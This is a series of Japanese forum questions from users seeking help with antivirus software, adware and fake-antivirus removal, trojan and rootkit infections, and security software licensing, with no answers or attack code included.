ある時間間隔で特定のインターネットサイトからデータを自動ダウンロードしていますが、たまに自動ダウンロードソフトがフリーズしてしまいます。どうもウイルス対策ソフトが原因ではと考えており、対策としては、この間ウイルス対策ソフトの機能（ファイアーウォール、リアルタイムスキャン、迷惑メール対策）を一時停止しようと考えています。この場合問題になることはあるでしょうか。この間、他のサイトを見ることはしませんし、またメールも見ないようにします。また、迷惑メール対策は止める必要があるでしょうか。 よろしくお願いします。
相談さしてください (1)ジャストシステムの無料セキュリティーが終了になるのでアンインソールした (2)無料のＡＶＡＳＴいれるとインターネットがすごく遅くなりアンインソール これ以後順序不明ですが (3)ジャストシステムの初期化中のアナウンスあり　それが続き　再度ジャストシステムインソール どうしたら良いか分からず (4)システムの復元　調子戻らず (5)ジャストシステム完全な除去方法欄から　ソフト解凍しアンインソール 1）その後インターネット接続出来ない状態となりました 2）プロバイダー確認しましたが問題なしの為　ＣＰ問題となっってます どこから確認し対処してよいか教えて頂ければありがたいです 以上です。
Snapdoを削除する方法を色々試して、IE,クロームをスタートしても出てこなくはなりました。ただどうしてもツールバーから削除することができません。 SnapdoはレジストリーからSnapdoの検索でひっかかるものを全て削除し、IE,クロームの検索設定を変更する方法で行いました。 IEのツール＞アドオンの管理＞ツールバーでは、「Disabled」というステータスになっていますがクリックするとSnapdoの画面に行ってしまいます。ツールバーのアイコン上での右クリックも作動しません。 削除方法もたくさん載っているので検索してみたのですが、これ以上探すことはできませんでした。どなたか教えていただけないでしょうか。よろしくお願いいたします。
勝手にIEのお気に入りにあるサイトが追加されます。しかも、何回削除しても コンピューターを再起動すると復活してます。最近、ローン計算サイトをお気に入りに追加したのですが、このサイトが原因で、同じサイトがゆっくりと、気づくと1000個つくられるんです。何度消してもダメです。 何か設定を変えられたのでしょうか？ 解決策を教えてください。
Anitimalwareというウイルス？に感染しています そのソフトはすべて英語で書かれているのでよくわからないのですが、 インターネットにはきちんと接続されているのに、開くことができません。 プログラムの追加/削除で「Antimalware」を探しても見当たりません。 勝手にスキャンが始まったり、アラートが出てきたりします。 それに5分間くらいに1度勝手に変な英語のアダルトサイトやよくわからない英語のサイトがブラウザで開かれます。 アンインストールソフトを別のパソコンから外付けHDDでこちらのパソコンに移しても、Security Alert! Virus Alert! Application can't be started! The file revouninstaller.exe is damaged. Do you want activate your antivirus siftware now? と出てきて、はいかいいえで問われ、開けません。 他のアプリケーションも同様に開けません... また、パソコンを放っておけばアラートばかり出てきます。 どうすればこのソフトを削除できるのでしょうか？ 色々自分なり調べてみたのですが、パソコンにはあまり詳しくないのでよくわかりませんでした。 最低、リカバリを考えておりますが、 仕事の大事なデータなどありますのでできるだけリカバリはしたくありません。 長くなってしまい、申し訳ありません。乱文で理解し難い文章ですが 少し急いでいるのでどうかご回答よろしくお願いしますm(_ _)m
ネット上で 騒がれてるようですが いまはどうなんですかね？ http://terusoku.ldblog.jp/archives/28805959.html 最近 対策ソフトの存在が「一人歩きのプログラム」に思えてくるｗ Ａｖａｓｔでも Ｈｏｓｔファイルが 消されたｗ ここでも 知識人が 一人歩き してますが。。。ｗ Ａｖａｓｔにて 誤検知 起こしてる人いたら その後どうなったか？聞きたいです。
現在定期購入をしていますが、昨日、最新内容にする更新依頼の情報がありました。 これって、無視してはいけませんか？・・・ 手動で更新しなくても、契約中は自動的に更新するような設定になっていませんか？・・・ 教えてネット、真実を・・・・・・・・・・・
20台ほどのPCを有線LANケーブルでつなぎ、ネットワークを構築し、その管理をしている者です。 一台のPCをサーバーとして、そのPC内に作ったファイルを共有し、他のPCで作業をするという形態をとっていたのですが、先日、突如他のPCからサーバーPCへ接続ができなくなりました。 ハード、設定ともに問題はありません。しかし、原因を探っていたところ、サーバーPCがトロイの木馬に感染していたことがわかり、即刻Microsoft Security Essentialをダウンロードし、木馬を削除しましたが、他のPCからは依然接続できません。 ちなみに、サーバーPCにはNortonを入れておりましたが、気付ば起動ができず、木馬に感染していた、という状態でした。 今回の接続ができなくなったことは、トロイの木馬が原因だったのでしょうか？また、復旧するにはどうすればいいでしょうか？ このネットワークで扱っていた情報は、個人情報や、機密情報が多く、漏えいすると大変困ります。木馬に感染していた時点で覚悟はしておりますが、実際の被害を確かめる方法などもありましたら、ご教授ください。 トロイの木馬の型 Trojan Dropper : Win 32/ Rotbrow.D Trojan Downoader : win 32 / Brantall.C なにとぞよろしくお願いします。
パソコン内にあるソフトのバージョンアップした際、新しいウインドウを開くときに毎回「ユーザーアカウント制御」認識できないプログラムがこのコンピュウータへのアクセスを要求しています。と出て仕事になりません。どのようにしたら、出てこなくなりますか？大至急教えてください。お願いいたします。
以外の条件をクリアするセキュリティ対策ソフトを教えて下さい。(マイクロソフトセキュリティエッセンシャルズは除く) (1)ダウンロードも無料で、使用も無料で、更新も無料でとにかく全て完全無料で使える (2)ソフトの表記が外国語ではなく日本語 (3)ウイルスやスパイウェアなどを発見しやすい (4)できれば、ヘルプファイルがついている (5)できれば、ファイアウォール機能がついている 上記の条件((4)(5)は必ずでもなくてもいいです)が揃うセキュリティ対策ソフトを教えて下さい。
ウィルスソフトでウィルスが検知され、今隔離状態です。 ウィルス名は　Win 32:Evo-gen[Susp]　です。 ウィルスソフトをダウンロードするときに、くっついてきたようです。 ウィルスソフトを交換する予定なので、隔離領域も削除します。 それでウィルスも削除されますか？ ちなみに、 Windows 7 sp1（32ビット） CPU：Genuine Intel 2.16GHz メモリ：1GB です。 よろしくお願いします。
ストアアプリしか利用できないWindowsRTは特別なセキュリティソフトを使わなくても安全性は非常に高いそうですが、となると、 x86のwindows8.1でもwindowsストアアプリしか使わなければ、windows8.1のセキュリティ性能はwindowsRTと同等ですか？ ストアアプリのみ利用で、デスクトップアプリは一切利用しない場合、標準のDefenderだけでPCの安全は保たれますか？ ストアアプリだけしか使わないとき、あえてノートンやカスペルスキーを入れる意味はありますか？ よろしくお願いします。
題名のとおりですが、まれにですがPC起動時に起動しません。 タスクマネージャ見てもccsvchst.exeがありません。 OS：Win7x32/SP1 Norotn：NIS　V20.4.0.40 ノーガードでは恐ろしいのでLANケーブルは抜いて起動して、最近はNortonの黄色いアイコンがタスクトレイに出るまで待ってからLANケーブルを挿しています。 何年か前にSymantecのサーバーと同期できないと起動しなかったり有効期限切れといわれたりしたケースを思い出しました。 ただし、Nortonを自分で起動する分にはLANケーブルを挿していなくても起動するし、有効期限切れと言われることもありません。 具体的にどうしたら良いでしょうか？ ・手動で起動していれば問題ない？ ・LANケーブルを挿してPCを起動したほうがSymantecのサーバにつながるので自動で起動しやすい？ 　(LANケーブルを抜いて起動しているからかえって起動しにくくなっている？) 以上、よろしくお願いします。
ウイルスバスターバスタークラブセンターの電話番号を教えて
USBメモリを挿入した時にマルウェアに感染したという話をよく聞きますが、これは自動再生ダイアログをよく確認せずにユーザーがマルウェアを選択したのが引き金ということでよろしいでしょうか？ 自動再生ダイアログを出さずに無確認でプログラムを自動実行させるようなAutorun.infの書き方があるのか？と思い検索してみましたがまったく見つかりませんでした。 挿入時に無確認実行出来るAutorun.infの書き方があれば教えて下さい。 私のWinXP SP3で無確認実行が可能か確かめてみたいと思います。（もちろんメモ帳とか安全なプログラムで）
無料ウィルスソフトのavast（アバスト）を使っています 訳あって、登録メールアドレスの変更をしたいのですが どうしてもやり方が分かりません やり方ご存知のかた、実際に変更された方 変更方法をおしえてもらえませんか？ 「一から登録しなおし」というのはナシでお願いします
こんにちは、よろしくお願いします。 他人のホームページを勝手に改ざんするウイルスがいることは知っているのですが、他人のホームページを改ざんしたり、ウイルスを仕込んだりするのはハッキングとかでもできることなのでしょうか？例えば、AさんがBという団体の悪事を暴くようなホームページを作ったとします。で、そのホームページを快く思わないBは、優秀なハッカーなどを雇い、世間の人がAのホームページを見なくなるように、Aのホームページにウイルスを貼付ける、、、といったことは起こりえるのでしょうか？ つまり私の質問は、何かの悪事を告発するようなホームページを立ち上げる場合、ホームページに細工されないようにするには、ウイルス感染にだけ気をつければ良いのか？ということです。また、「そういうホームページを立ち上げる際は、こんなことに気をつけたほうがいい」、みたいな注意点もありましたら、どなたかご教授いただければ幸いです。
タスクマネージャーのプロセス欄に「winlogon.exe」が表示されているのですが なにやら調べてみるとウイルスの可能性があるようです 「ユーザー名」と「説明」の欄にも何も表記されてないのにメモリは116Kも使ってます プロパティやファイルの場所も開けません ほぼ毎日市販の総合セキュリティソフトでスキャンしているので セキュリティソフトでも検知できないように偽装してるってことでしょうか？ 不安なのでどなたか対処方法教えていただけないでしょうか
タブレットnexus7（アンドロイド 2012版16GB）に適したセキュリティーソフトを探しています。 WEBで検索するとスマホのアンドロイドに適したものとかの比較は結構あります。 よくわからないのは、ＯＳがアンドロイドであればスマホであろうがタブレットであろうが、 『アンドロイド用セキュリティーソフト』であればどれでもよいのでしょうか？ また、タブレット用としておすすめできるものがあれば教えてください。 よろしくお願いします。
そのようなことが可能な仕組みは、Windows XP Home SP3 で有効になっていますか？ USBメモリを挿入した時に、 自動再生や自動実行のダイアログが出ることなく、 無確認でUSBメモリ内のプログラムを起動させることは、デフォルト状態のWindows XP Home SP3で可能ですか？ そのような危険な仕組みが標準でONになってるとは考えにくいですが、もしかしたらと思い質問しました。
パソコンはバリュースター（vista)です。 メールソフトはウィンドウズメール。 これまで普通にメールできていたのですが突然できなくなりました。 プロバイダはｅｏ光なので問い合わせたら、 セキュリティーソフトの問題ですと言われました。 セキュリティソフトはavast!です。 これのメールシールドの「受信メッセージを検査します」「送信メッセージを検査します」のチェックボタンを外せば、これまで通りメールができるようになりました。 ただ、これだとウィルスが怖いので今は再びチェックボタンを入れています。 質問は、avast!の設定をどうすれば普通にメールができるようになりますか？ ご存じの方、是非是非よろしくお願いします。
昨日、AVGウィルススキャンを行ったらルートキットが検出されました。 同AVGにてルートキット削除を行うも、再起動するとファイル名が変った状態でまた検出されてしまいます。 検出内容は C:\Windows\System32\Drivers内 pci.sys,フックされたインポート ntoskrnl.exe Io AttachDevice To Device STack atapi.sys,フックされたインポートataport.SYS AtaPortREADPortBufferUshort atapi.sys,フックされたインポートataport.SYS AtaPortREADPortUchar インラインフック ataport.SYS DllUnload と表示されます システムの復元から、最近インストール等行ったポイント以前に復元を行うも再度検出されます。 どのようにしたら、駆除できますでしょうか？ またWindows7のバックアップ機能を使うのも検討してますが、バックアップを行った場合 システムイメージ（Cドライブ）及び指定のフォルダ以外は、バックアップ時点と同じように 削除されてしまうのでしょうか？ それとも、バックアップ指定の範囲だけ更新されてその他のドライブに残るファイルは現時点の まま復元されるのでしょうか？ 初めて、ルートキットに感染また駆除出来なかったため困惑しております。 回答よろしくお願いします。
　添付図のような，ケバケバしく赤の点滅が有ります。 『　OK　』を押しても大丈夫でしょうか？ 事情に詳しい方，教えてください。 こちらでは，緑の点滅で同じような不審を感じます。 　ソフトのダウンロードを促してきます。 http://jp.ask.com/ans?l=sem&ifr=1&qsrc=999&ad=se …
Macユーザーだけど、Boot CampでWindows 7 Ultimat を入れました。 Macでは、 ESET Cyber Security Proを入れてます。 Mac上で、ESET Cyber Security Proが、Boot Camp上で ウイルスを感知しました。駆除しても駆除してもダメで とうとう、Windows 7 Ultimatk殺しました。 ESET Cyber Security Proのサポートの人によると Windows 7 Ultimat上で感染したのではないかとのこと。 McAfee入れてるのに。ダメじゃん。全然。 ウイルスバスターとか、ノートンの方が、よほどいいよ。 明日、McAfeeに電話して返金してもらおうと思ってます。 どう思いますか？
Windows８から8.1にアップデイトしたら、ノートンツールバーが使えなくなってしまったようです。 アドオンの管理では、「互換性なし」と表示されてしまっています。 昨夜は使えたのですが、何をやったら表示されたのか覚えがありません。 検索するとFirefoxがらみの、同様の症状がヒットしますが、あきらめるしかないという回答が目立ちます。 私の場合も、システムの復元をしてあきらめた方が良いのでしょうか。 どうやったら表示される（使える）ようになるのか、ご存知の方みえましたらお教えくださいませ。
http://safeweb.norton.com/ http://global.sitesafety.trendmicro.com/index.php http://app.webinspector.com/ http://vms.drweb.com/online/ http://gw.aguse.jp/ http://check.gred.jp/ ↑のサイトは無料で利用できるものですか？
aguseの利用は無料ですか？ それと、このサイトを利用することは違法だったりはしませんか？
Windows7 にて、スーパーセキュリティZEROを利用しています。 しかし、スーパーセキュリティ問題となり、 「リアルタイム保護が無効になっています」となり、開始ボタンを押しても、「失敗しました」となります。 windows Defenderのリアルタイム保護　を無効にしても、できませんでした。 このような場合、どのように対応したらいいか教えてください。 よろしくお願いします。
度胸試しというサイトがウイルスに関係していないか心配になったので質問させていただきます。 www.geocities.jp/n_chin_k/dokyou.html‎ ↑のサイトはウイルスにかかるものなのでしょうか？ よろしくお願いします。 今度からはむやみに検索しないようにしようと、反省しております。
本日、PC画面の上部に、「Your PC performace is poor」という細長い表示が出るようになりました。 クリックするとダウンロードせよ、とのこと。これは安全なアラームでしょうか？無視しても何度も出てきます。PCにお詳しい方、ご教授下さい。
ESET Smart Security 6を使用しています。 Reflector - AirPlay mirror your iPhone or iPad to any Mac or PC http://www.airsquirrels.com/reflector/ 上記のソフトウェアを使ってiPhoneの画面をPCに表示させないと思っています。 ただ、Smart Securityのファイアウォールが機能して上記ソフトが使えません。 ファイアウォールを一時的に停止をさせるときちんと動作します。 ファイアウォールが機能している状態だと全く反応しません。 上記ソフトを使うためにSmart Securityの設定などで このソフトウェアだけをファイアウォールを無効（許可）にすることはできないでしょうか？ よろしくお願いします。 使用OS　64 bit版　Windows 7 professional ウイルスソフト　ESET Smart Security 6
セキュリティ対策としてスーパーセキュリティZEROというのを使っていました。 どうにも不具合が多くて、サポートに問い合わせても解決できないので、違うものに入れ替えることにしました。 まず、スーパーセキュリティZEROを提供されているアンインストーラーを使ってアンインストールし、新しいソフトをインストールしようとしたのですが、 BitDefenderというのが入っているので、インストールできないというメッセージが出て、止まってしまいました。 これをアンインストールしようとして、コントロールパネルのプログラムと機能から開いたのですが、BitDefenderというのが見当たりませんでした。 ネットで調べたら、BitDefenderの削除ツールというのが見つかったので、とりあえずそれを使ってみたら、削除できてしまいました。 改めて、新しいソフトをインストールしたら、ものの見事にインストールできて、快適に動いています。 ということで、現在問題はなくなっているのですが、このBitDefenderというのは何者なんでしょうか？ もちろん、自分ではこんなものインストールした覚えはありません。 PCに最初からおまけで付いていたものでもなさそうです。
ウィルスなどについてお聞きします。クリーンインストールしたんですが、ウィンドウズアップデートがなにをやってもできないということがあるんですが、それ以外にも、サウンドデバイスが消えてるんですよね。それに関しては何もいじってないですが、勝手に消えてたという感じです。 もしかしてと思ったのですが、ハードディスクに問題があるかもしれないと根拠はないですが、以前にハードディスクに問題がある場合があると聞いたもので。クリーンインストールしても、以前のが何らかの形でハードディスクに残っててその中にウィルスがいるとかということは考えられるでしょうか。ハードディスクはSATAです。
先日、当方の旧式PCのXPをLUBUNTU 13.04と入れ替えました。そこでセキュリティソフト（AVG 2013 LINUX用）をインストールしましたが、デスクトップ画面上表示されておりません。また、手動でウィルススキャンをかけてみたいものの、どこに入っているのか見当たりません。 また、ファイアウォールの設定をしたいのですが、これも場所がわかりません。 XPはそれぞれ場所がわかりやすかったのですが、LUBUNTUはまだ不慣れで手探り状態です。そこで素人にもわかるように説明頂けないでしょうか。何卒宜しくお願い致します。
スタートメニューの削減する方法を教えてください。お願いします。
win7 64bitのパソコンにCOMODO Internet Security6を入れました。 ブラウザをサンドボックス状態で起動させた時に ブラウザ画面上で半角英数字の入力は出来るのですが、日本語での入力は出来ません。 どうすれば日本語入力できるのでしょうか？
ノートン360をＰＣ３台で使っています。ノートン360は３台まで使えるらしいです。 うち1台のＰＣを買い替えるのですが、 その場合は使用しなくなるＰＣからノートンをアンインストールして、 新しいＰＣにダウンロードするそうですが、本当にうまく行くか心配です。 ノートンはプロダクトキーとシリアルナンバーを用意すれば大丈夫でしょうか？ どのサイトで行うのか、シリアルナンバーなど入力するタイミングはいつなのか、 教えてください。 宜しくお願い致します。
yieldmanager.com　というのが、新しいウィンドウにて勝手に開いて困ってます。 過去の同様の質問がありましたが、解決方法の通り実施しても消えてくれません。 （cookieの削除や、インターネットオプション→プライバシー→サイト→ブロック） アドオンやプログラムのアンインストールも試みようと思いましたが、どこにも見当たらないため削除できない状態になっております。 10月の初旬からこのような状態になっており、インストールされた日付（新しい順）に並べてみても、インストール・更新されたものを削除かけてみたものの、なにも変わらない状態です。 ＯＳはWindows7です。 パソコンにあまり詳しくないため、他の方法もわからず本当に困っております。 何かほかの方法をご存知の方、お手数ではありますが解決方法を教えてください。 また、初めての質問につきカテゴリ違いでしたらすみません。
基本的なことなのかもしれませんが、ぜひ教えてください。 iPhoneはウイルスの心配が無いと聞き、購入しました。 今回iPhoneとＰＣをＵＳＢで接続し、iPhoneのデザリングでＰＣをインターネットに接続しようと思っているのですが、これでもウイルスの心配は無いのでしょうか。 メールは使用せず、webサイトの閲覧に使用したいのですが。 お知恵を貸してください。 よろしく、お願いします。
　カスペルスキーの『マルチプラットフォーム・セキュリティ』３年版を持っています。 パッケージには、「これ１本でスマホもタブレットもあなたがどのデバイスを持っていても、セキュリティ対策はこれ１本で万全です。」とあります。 　でも、『マルチプラットフォーム…』はＣＤ版です。どうやってタブレットにインストールすればいいのでしょう？ 　で、アマゾンのタブレット『キンドル』の紹介を見ていたら、「ｍｉｃｒｏ－Ｂ　ＵＳＢポート」というものがありました。 これでタブレットとＰＣをつないで、『マルチプラットフォーム…』のＣＤからインストールということができるように思うのですが、どうでしょうか。 　せっかく何台ものＰＣ等にインストールできる『マルチプラットフォーム…』なので、有効に使いたいので、『キンドル』に詳しい方、教えてください。
今ウィルスソフトでも、１つのシリアルナンバーで 複数台が使用出来る物が有りますが その質問じゃなく、１つのナンバーで１台のタイプを 複数で使用した場合の問題点等を質問します 今回使用してるソフトはESET Smart Securityです 尚、質問の前に 通常はウィルス用ソフトが正式名称なのは知ってますが 販売店等ではウィルスソフトで通用する為 ここでもウィルスソフトと書かせて頂きます まず…これは私の設定ミス(？)なんですが 今ウチにはパソコンが３台有り １台が私が使用してるビスタ、残りの２台(ＮＥＣ)が７と８です それで…今迄ウチでは私のビスタを除くと家族で７を使用してました しかし、不具合が生じたのと 保障期間の関係で、メーカーへ修理に出したんです しかし、その間もパソコンが無ければ不自由と家族が判断 年数も経過してる事を考えて、新たに８を買いました …と、ここ迄は良かったんですが その８を私がセッティングしたんですが その時ウッカリして、８に７と同じシリアルでソフトを入れました 但し、この団体では特に問題無く使用出来てます それで修理には出したんですが ハード的な問題じゃなくソフト的だとの判断だった為 ウチでリカバリーして欲しいと返って来ました この７に関しては、現在８とは違う部屋に置いてます それで、未だ私の手が空かない為リカバリーしてないんですが それでも私の部屋の近くな為 私のパソコンが使用中等の時等 その７でネットにアクセスした事が有ったんですが その時、ソフトのアップデートを確認して 後から同じシリアルなのに気が付きました ただ…あく迄理論上ですが この２台のパソコンに同じシリアルで入ってるのは ある意味理解出来る事です それは、修理に出した時も該当しますが 通常一方の電源を切ってれば もう一方のパソコンでデーターが更新されても ソフト自身から見れば電源を切ってるパソコンが 処分等したのと同じ感覚だと思いますから データー更新出来るんだと思います これは、パソコンを処分する時でも ハードディスクが壊れた時等なら 電源を入れて、ソフトを削除する事も出来ない訳ですから ある意味当然の事だろう…と… ただ…現在の様な使用方法が続いた場合 今後、何かトラヴル等が考えられるんだろうか？ 考えられるなら、どんなトラヴルなんだろう？…と思ったんです 勿論、近々リカバリー予定なんで リカバリーすれば問題無いのも分かってますが…
自分のパソコンでのセキュリティは今どの様な状態にあるか知る方法がありますか。教えて下さい 因みに機械はWindows８です。
J:COMのマカフィーforZAQについて J:COMを解約したのにマカフィーforZAQが普通に使えています。普通は解約したら利用できなくなるらしいんですがどうしてでしょうか？ うれしい事ではあるんですか…
最近インターネットを開いていると、すぐに“ウイルスソフトをダウンロードするように”という内容の英語の表示が出てパソコンが動かなくなります。最初はたまにだったのですが最近は頻繁に出て動かないことが多くなり困っています。２年近く前にパソコンを購入しました。パソコン購入時のウイルスバスター無料期間が過ぎてからウイルスソフトを購入したことはありません。パソコンはインターネットでしか使用しないので困っています。無料ソフト（KINGSOFT広告あり）をダウンロードしたら治りますか？正規のウイルスバスターを購入したほうがいいでしょうか？
ノートンから何かアクセス表示があったので遮断を選ぶとネットワークから遮断しましたと 右下ら出ましたそれ以降 ネットワークを検出できませんこれはトンネルプロトコル（たとえば　VPN）に 起因する可能性がありますまたはコンピュータがオンラインではありません 再び試しますかと表示される 設定をデフォルトにしても治らない LANケーブルはつながっています 何か無線LANを探しているようです ウイン８でインターネットも出来ます CPU使用率などが表示されなくなりました 改善方法か元に戻す方法を教えて下さい
Win7のPCにセキュリティソフトを入れたいのですが、ノートンとは相性が悪いようで 他のソフト入れたいんですが、どのセキュリティソフトがお勧めでしょうか？ 自分としては「ESET パーソナル セキュリティ」「カスペスルスキー」「マカフィー」あたりがいいかなと 思っているのですが、この中では何がいいですか？又は他にいいソフトがありますか？
free zipというソフトウェアがＰＣ起動時に インストーラーが起動されてしまいます どうやら動画キャプチャのサイトをめぐっているときに 海外のサイトで勝手にいれられてしまったようです まだインストールはしていないので コンパネのアンインストールにはありませんし どうすれば起動時にでないようにできるでしょうか？ 何かすでに入れられているのなら削除したいです よろしくお願いします
不要なソフトが入っていても「自分では絶対入れてない」と言う人がいますが、そういうケースはあるのでしょうか。 部署内で、パソコンに詳しくないながらもパソコンの面倒を見ています。 部署内のパソコン内のユーザーアカウントには管理者権限が与えられています。 なので、会社のポリシーはあるものの、大半のユーザーはパソコンライフを自由に謳歌しています。 「パソコンの調子が悪い」と問い合わせを受けて実際に見ますと、すべて無料ですが、セキュリティスキャン、レジストリ最適化、ドライバーのバージョンチェック、ツールバー、FTP、ファイル共有、聞いたことのない名前のクラウドのソフトウェアが入っています。 ツールバーが５本入っているなんてざらです。そしてなぜか有効化して非表示にしています。器用だなと思います。 パソコン使用者に聞きますと「入れた憶えはない」「勝手に入ってた」「勝手に入った」「誰かが入れた」という本気の回答が大半です。中には部署や会社のネットワークやセキュリティの脆弱性云々と文句を言う人がいます。 また、問い合わせがあった際、同じネットワークで同じようなソフトウェアが「勝手に入ってた」例はありません。特定の人ではありませんが、いつでも一人です。 質問です。 上記のようなソフトウェアが「勝手に入る」例というのはあるのでしょうか。 「勝手に入った」のであれば、勝手に入る環境づくりをしてしまった使用者に問題があると思いますので、結局「勝手に入った」のではないと思うのですが、いかがでしょうか。 インストールの確認画面がウインドウの裏に隠れている例はよく見ますが、それでも結局「OK」ボタンを押すなりEnterキーを押すなりしたのは自分だと思うのですけど…。
Windows８にしてセキュリティソフトは今まで使ってたMSEを入れようとしたら既にあるから大丈夫って言われました。 でもファイルを右クリックしても～でスキャンというメニューが出てきません。 Windows Defenderで個別のファイルを右クリックメニューからスキャンする方法を教えてください。
REG CLEAN PROの削除はどのようにすればいいのでしょうか
題名の通りですが、ウィルスバスターの「更新手続き（新規ではない）＝更新を商品として購入」ができるのはネット経由のみですよね？ あるトラブルがありましたので知りたいです。 よろしくお願いします
Facebookから届くメールは、いつもフ一シングメールです。 パスワードを替えたら良くなると聞いたので変更したのですがなにも変わりません。 いつも削除しているのですが何か良い方法はありませんか。教えてください。老人
windows8で自作PCの場合 １．　7以前のwindowsOS同様の再インストール（アクティベーションやり直し） と ２．　windows8の新機能「リセット」（アクティベーション維持したまま初期化） の二種類あるんですが、より安全性の高いのはどちらでしょうか？ OSの仕組みやPCセキュリティに詳しい方がいたら教えてください。
バスターは電気屋さんで購入？ 　出来ますか？ ３年ほど前にＰＣ購入時点では バスター注入しておりますが・・・ 　これは期限がすぎて 無効なのでしょうか？ 　識者様教えて頂けませんでしょうか？
ウイルス対策ソフトについてはあまり詳しくないのですが・・・。 kingsoft antivirusを使っているのですが、「標準ユーザー」のアカウントでは全く機能していないことが分かりました。 調べてみると、「標準ユーザー」のアカウントで機能するウイルス対策ソフトって、少ないと書かれているページもありました。 質問の要点をまとめると、 (1)ウイルス対策ソフトは標準ユーザーでは機能しないのですか？　つまり、「標準ユーザーで立ち上げること」＝「ウイルス対策なしでパソコンを使うこと」になるのですか？ (2)標準ユーザーでも使えるウイルス対策ソフトってありますか？ (3)標準ユーザーを差別する理由は何ですか？ よろしくお願いします。
お世話になります。 今朝インターネットをしていたらセキュリティソフトが立ち上がり「脅威」の文字が出てきました。 突然開いていたページが消えて何も出来ない状態になってしまいました。 デスクトップには見慣れないアイコンがあり、右下には赤色の英語の文字で「WARNING」と表示され 英語が読めないので推測になりますが「駆除するために購入」というような「BUY」と書かれたボタンが出てました。 英語だし読めないし、購入するつもりはなかったのでそのままにしていたところ ネットにつながらず電源も落とせない状態になってしまいました。 電源ボタン長押しで強制的に落とし再度立ち上げても操作不能。 もともと入っているセキュリティソフトが立ち上がり 「感染が残っていないことを確認するため再スキャンしています」と出て 「既存の感染がシステムから削除されました。一部の感染がユーザーデータにアクセスしていることがわかりました」と出ました。 そのまま「続行」を押そうとしても何も反応せずで削除出来ていないのかもしれません・・・ http://www.geocities.co.jp/Playtown-Yoyo/6130/no … こちらのサイトを参考にやってみましたが、手順通りに進めても【３】で行き詰ってしまいます。 「レジストリエディタを開いて下の場所まで移動する」という項目を満たせません。 「CurrentVirsion」というのが見つからないため、「Run」のフォルダがないのです・・・ 【２】の手順で怪しいフォルダはゴミ箱にいれてありますが、なにかやり方を間違えてるのでしょうか？ ゴミ箱を空にしてシステムの復元したらいいのかな？と思ったりしましたが システムの復元そのものが無効になっていて出来そうにないです。 今はケーブルを抜いた状態でセーフモードで起動してあります。この状態で復元ポイントを作ろうとしても おかしくなった状態のままだと意味がないですよね？ 最悪の場合は買ったときの状態に戻してもいいと思っています。 でもウイルスを削除しないと、買ったときの状態に戻しても意味ないですか？ パソコンに対する知識がまったくありませんので、説明が下手ですみません。 今現在は以前使っていた古いパソコンを使って投稿しています。 このパソコンも壊れかけているため、文字を打つにもページを開くにもすごく時間がかかるため 補足やお礼が遅くなってしまうかもしれませんが… ご教授よろしくお願いします。
ウィルスについて２つ聞いてみたいことがあります。 １つめは、クリーンインストールするために個人で保存してるファイルを外付けハードディスクなどに保存してOSをクリーンインストールしたあとに外付けハードディスクに保存したファイルを新しいシステムファイルが入ってるハードディスクに戻すときその外付けハードディスクをつなげた瞬間に、その外付けハードディスクに潜んでるウィルスが反応して新しいシステムファイルが入ってるハードディスクに入り込んでくるウィルスもいることは考えられるでしょうか。 ２つめは、こんなものを見たのですが↓ http://itpro.nikkeibp.co.jp/article/NEWS/2007122 … これって、ウィルスが寄生する対象物がファイルではなく同じ実行ファイルであれば、拡張子も含めて見た目がまったく同じになるのでしょうか。
元々の実行形式のファイルにウイルスを組み込んで、置き換えるウイルスがあります。 見た目は、今までのファイルとは違いがありません。(拡張子が変わっているかも？） ↑これを見たのですが、そもそもウィルスは実行ファイル(EXE)以外のファイルもあるのですか？もしなければ上記の拡張子は変えられないですね。パソコン初めて間もないですがよろしくお願いします。
元々の実行形式のファイルにウイルスを組み込んで、置き換えるウイルスがあります。 見た目は、今までのファイルとは違いがありません。(拡張子が変わっているかも？） ↑これを見たのですが、拡張子も含めてまったく同じに置き換えるウィルスもあるのですか？ふとした疑問です。
ホワイトリスト方式のパーソナルファイアウォールを探しているのですが、 フリーで提供されているものはあるでしょうか？
私はセキュリティーソフトにAvast!antivilsの無料版を利用しています。 前回、2週間ほど前にスキャンして、1つウィルスが発見されたので、削除しましたが、そのせいでOSが壊れてしまいました。(今ではセーフモードでバックアップの復元で直りましたが…) それで、しばらくスキャンを手抜きしていました。 それで今回ウィルススキャンを実行したら、なんと224個もの大量のウィルスが発見されました。(感度最大でスキャンしました。) 特にウィルスに感染しているようなことはしていないと思うのですが… これはAvastの誤検出でしょうか… 一つ思い当たることですが、Aviraをダウンロードしました。 セキュリティーソフトを2つダウンロードすることは絶対にダメなのは知っていますが今は様子見のために2つ併用しています。 また、Microsoftのvisital expressをダウンロードしました。
Windows7のパソコンを家族で使っています。 家族それぞれにユーザーアカウントを作って、私とカミさんは「管理者」で、子供の二人には「標準ユーザー」にしています。 パソコンのウイルス対策には、kingsoft antivirusをインストールしていますが、子供たちがパソコンを起動すると、kingsoft antivirusから、「管理者」権限のパスワードを要求してきます。 子供たちのユーザー権限を「標準ユーザー」のまま、kingsoft antivirusを起動する方法はありますか？ ウイルスソフトなのに、標準ユーザーで起動したら、ウイルス対策ソフトが起動しない使用になっているなんて理解出来ないのですが、こんなもんですか？
XPのサポートは、来年四月で終了のようです。　自治体の中には、まだ、 多数のXP機が残っているみたいです。 私も、三台のPC所有の中で、一台は、XP機です。 Window8などの、最新鋭機器が、便利が良いのでしょうけど、使い方によっては、 そんなに能力の要らない旧機種でも足り場合もあります。 サポートが終了すると、セキュリティの問題があるそうですが、マイクロソフト社に 関係なく、XP用のセキュリティソフトは、ありませんか？ 何だか、OSの世代交代は、マイクロソフト社のペース、営業戦略に乗せられて いるようで、面白くありません。 よろしくお願いします。
ここの無料フリーソフトは使用しても安全でしょうか？ 大手のサイトでも むやみにダウンロードするのは止めた方がいいですか？ よろしくお願いします。
xpを使っているんですがこれに対応してるウィルス対策ソフトを使用してます。しかしウィンドウズアップデートをしていなければ意味ないですか？
外付けハードディスクの中をウィルスチェックしていたら、「G:\System Volume Information\_restore{12D6D169-C415-499E-891D-F51A0F4D2CD3}\RP7\A0004299.exe」というのが出てきました。個人的にそのハードディスクに入れてるファイルやフォルダなどを調べてみてもその名前のファイルはまったくみつかりませんでした。これはどういうものなのでしょうか。 System Volume Information　は目に見えないところに隠されてる場所なのでしょうか。
